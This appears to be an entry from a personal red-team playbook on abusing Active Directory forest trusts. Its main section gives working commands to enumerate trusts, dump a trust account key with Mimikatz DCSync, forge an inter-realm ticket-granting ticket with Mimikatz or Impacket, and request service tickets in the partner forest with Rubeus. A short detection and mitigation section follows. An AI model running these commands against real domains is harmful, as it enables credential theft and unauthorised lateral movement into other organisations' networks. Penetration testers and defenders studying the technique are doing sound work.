---
title: "Attack #69 — Forest Trust Abuse Cross-Forest Ticket Forging"
description: "When two forests have a forest trust, users from one forest can access resources in the other (if explicitly permitted). An attacker who compromises the…"
category: active-directory
tags: ["active-directory", "kerberos", "credential-access", "hashing"]
tools: ["Impacket", "Mimikatz", "Rubeus", "PowerShell"]
difficulty: advanced
updated: "2026-08-10"
source: "vault:ActiveDirectory/AD-Attack/Category-Nine/🔶 Attack #69 — Forest Trust Abuse Cross-Forest Ticket Forging.md"
---
# 🔶 Attack #69 — Forest Trust Abuse / Cross-Forest Ticket Forging

***

## 📖 How It Works

When two forests have a **forest trust**, users from one forest can access resources in the other (if explicitly permitted). An attacker who compromises the **inter-realm trust key** (the password of the `FOREST2$` trust account) can forge inter-realm TGTs to access the trusted forest. Unlike intra-forest trusts, **SID filtering IS enforced** on forest trusts — so the ExtraSids trick from Attack #68 won't work. Instead, the attacker must target **shared/delegated groups** that have been granted access across the trust.

***

## ⚙️ Prerequisites

| Requirement | Detail |
|---|---|
| **KRBTGT hash (your domain)** | Or the inter-realm trust key |
| **Trust relationship exists** | Bidirectional or one-way forest trust |
| **Shared groups / resources** | Foreign domain groups your SID matches |

***

## 💻 Full Commands

```powershell
# ── Enumerate trust relationships ─────────────────────────────────────────────
Get-ADTrust -Filter * | Select Name,Direction,TrustType,ForestTransitive

# ── Dump inter-realm trust key ────────────────────────────────────────────────
mimikatz.exe "lsadump::dcsync /domain:corp.local /user:partner$" exit
# partner$ = the trust account for partner.com forest trust

# ── Forge inter-realm TGT ─────────────────────────────────────────────────────
kerberos::golden /user:Administrator /domain:corp.local \
  /sid:S-1-5-21-<corp_SID> /rc4:<trust_key_hash> \
  /service:krbtgt /target:partner.com /ptt
# This creates a referral ticket to the partner forest

# ── Request TGS in the foreign forest ─────────────────────────────────────────
.\Rubeus.exe asktgs /ticket:<inter-realm_TGT> \
  /service:cifs/PARTNER-DC.partner.com /dc:PARTNER-DC.partner.com /ptt
```

```bash
# ── Impacket ──────────────────────────────────────────────────────────────────
ticketer.py -nthash <trust_key_hash> \
  -domain-sid S-1-5-21-<corp_SID> \
  -domain corp.local \
  -spn krbtgt/partner.com \
  Administrator

export KRB5CCNAME=Administrator.ccache
# Then access permitted resources in partner.com
```

***

## 🛡️ Detection — Event IDs

| Event ID | Source | What to Look For |
|---|---|---|
| **4769** | Security Log (DC) | TGS request from external forest |
| **4768** | Security Log (DC) | Inter-realm TGT referral |

***

## 🔗 Attack Chain Context

```
[Forest Trust Abuse] ──→ Cross-forest lateral movement via trust key
         │
         ├──→ ⚠️ SID filtering BLOCKS ExtraSids on forest trusts
         ├──→ 🔗 Must target groups explicitly shared across trust
         └──→ 💀 Defeated by: selective authentication, minimize trust scope
```

***

> ✅ **Attack #69 — Forest Trust Abuse complete.**
